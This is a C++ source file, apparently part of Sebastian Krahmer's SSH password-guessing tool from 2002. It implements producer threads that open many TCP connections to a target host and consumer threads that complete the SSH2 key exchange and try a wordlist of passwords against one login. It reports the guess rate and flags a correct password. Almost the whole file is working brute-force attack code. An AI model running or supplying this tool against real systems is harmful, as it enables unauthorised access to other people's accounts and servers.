/*
 * Copyright (C) 2002 Sebastian Krahmer.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Sebastian Krahmer.
 * 4. The name Sebastian Krahmer may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */
#include <stdio.h>
#include <sys/types.h>
#include <pthread.h>
#include <list>
#include <unistd.h>
#include <iostream>
#include <time.h>
#include <sys/time.h>
#include <errno.h>
#include "thread.h"
#include "ssh.h"
#include "misc.h"


using namespace std;

list<int> creater::slist;
pthread_mutex_t creater::slist_lock = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t creater::slist_max_cond = PTHREAD_COND_INITIALIZER;
pthread_cond_t creater::slist_min_cond = PTHREAD_COND_INITIALIZER;

pthread_mutex_t dictionary_lock = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t output_lock = PTHREAD_MUTEX_INITIALIZER;
int j = 0;	// number of tries
time_t now;

int creater::create_connection()
{
	int sock = tcp_connect(host.c_str(), port);
	if (sock < 0)
		cerr<<strerror(errno)<<endl;
	pthread_mutex_lock(&slist_lock);
	slist.push_back(sock);
//	printf("P%d %d\n", slist.size(), max_connections);
	while (slist.size() > max_connections) {
//		printf("SLEEP1\n");
		pthread_cond_wait(&slist_max_cond, &slist_lock);
	}
	if (slist.size() == 1)
		pthread_cond_signal(&slist_min_cond);
	pthread_mutex_unlock(&slist_lock);
	return 0;
}


int creater::consume_connection()
{
	pthread_mutex_lock(&slist_lock);
	while (slist.size() == 0) {
//		printf("SLEEP2\n");
		pthread_cond_wait(&slist_min_cond, &slist_lock);
	}
//	printf("C%d\n", slist.size());
	int sock = *slist.begin();
	slist.erase(slist.begin());
	if (slist.size() == max_connections)
		pthread_cond_signal(&slist_max_cond);

	pthread_mutex_unlock(&slist_lock);
	return sock;
}


void *producer_thread(void *vp)
{
	thread_data *td = (thread_data*)vp;
	creater c(td->host, td->port);

	for (;;)
		c.create_connection();
	return NULL;
}


void *consumer_thread(void *vp)
{
	thread_data *td = (thread_data*)vp;
	creater c(td->host, td->port);
	SSH2 *ssh;
	string pwd;
	int i, r;
	struct timeval tv;

	for (;;) {
		ssh = new SSH2;
		ssh->set_socket(c.consume_connection());
		if (ssh->banner_exchange() < 0) {
			//fprintf(stderr, "%s\n", ssh->why());
			goto retry;
		}	
		if (ssh->kex_init() < 0) {
			cerr<<ssh->why()<<endl;
			goto retry;
		}
		if (ssh->dh_exchange() < 0) {
			cerr<<ssh->why()<<endl;
			goto retry;
		}
		if (ssh->newkeys() < 0) {
			cerr<<ssh->why()<<endl;
			goto retry;
		}
		
		for (i = 0; i < td->tries; ++i) {
			pthread_mutex_lock(&dictionary_lock);
			++j;
			if (!(cin>>pwd))
				break;
			pthread_mutex_unlock(&dictionary_lock);
			r=ssh->userauth_passwd(td->login.c_str(), pwd.c_str());
			gettimeofday(&tv, NULL);
			pthread_mutex_lock(&output_lock);
			printf("\r[ %05d ][ %05d ][ %015f ]"\
			       "[ %8s ][ %15s ]\r", j, (int)(tv.tv_sec - now),
			       (double)j/(double)(tv.tv_sec-now+0.001),
			       td->login.c_str(), pwd.c_str());
			if (r == 0)
				printf(" (!)\n\a");
			if (r < 0) {
				//cerr<<"Too fast?\n";
				i = td->tries;
			}
			pthread_mutex_unlock(&output_lock);
		}
		retry:
		close(ssh->get_socket());
		delete ssh;
	}
	return NULL;
}


void *single_try(void *vp)
{
	thread_data *td = (thread_data*)vp;
	SSH2 *ssh;
	int i, r;
	string pwd;
	struct timeval tv;

	for (;;) {
		ssh = new SSH2;
		r = tcp_connect(td->host.c_str(), td->port);
		if (r < 0)
			goto retry;
		ssh->set_socket(r);
		if (ssh->banner_exchange() < 0) {
			//fprintf(stderr, "%s\n", ssh->why());
			goto retry;
		}	
		if (ssh->kex_init() < 0) {
			cerr<<ssh->why()<<endl;
			goto retry;
		}
		if (ssh->dh_exchange() < 0) {
			cerr<<ssh->why()<<endl;
			goto retry;
		}
		if (ssh->newkeys() < 0) {
			cerr<<ssh->why()<<endl;
			goto retry;
		}
	
		for (i = 0; i < td->tries; ++i) {
			pthread_mutex_lock(&dictionary_lock);
			++j;
			if (!(cin>>pwd))
				break;
			pthread_mutex_unlock(&dictionary_lock);
			r=ssh->userauth_passwd(td->login.c_str(), pwd.c_str());
			gettimeofday(&tv, NULL);
			pthread_mutex_lock(&output_lock);
			printf("\r[ %05d ][ %05d ][ %015f ]"\
			       "[ %8s ][ %15s ]\r", j, (int)(tv.tv_sec - now),
			       (double)j/(double)(tv.tv_sec-now+0.001),
			       td->login.c_str(), pwd.c_str());
			if (r == 0)
				printf(" (!)\n\a");
			if (r < 0) {
				//cerr<<"Too fast?\n";
				i = td->tries;
			}
			pthread_mutex_unlock(&output_lock);
		}
		retry:
		close(ssh->get_socket());
		delete ssh;
	}
	return NULL;
}


